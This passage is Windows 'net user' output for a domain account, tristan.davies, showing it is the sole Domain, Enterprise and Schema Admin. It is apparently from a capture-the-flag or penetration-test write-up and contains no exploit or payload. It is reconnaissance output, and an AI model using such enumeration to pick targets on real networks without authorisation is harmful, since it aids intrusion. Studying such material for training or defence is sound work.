search\tristan.davies

C:\>net user tristan.davies
User name                    Tristan.Davies
Full Name                    Tristan Davies
Comment                      The only Domain Admin allowed, Administrator will soon be disabled
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            07/05/2022 15:40:17
Password expires             Never
Password changeable          08/05/2022 15:40:17
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   07/05/2022 15:34:44

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *Domain Admins        *Domain Users         
                             *Enterprise Admins    *Group Policy Creator 
                             *Schema Admins        
The command completed successfully.
```



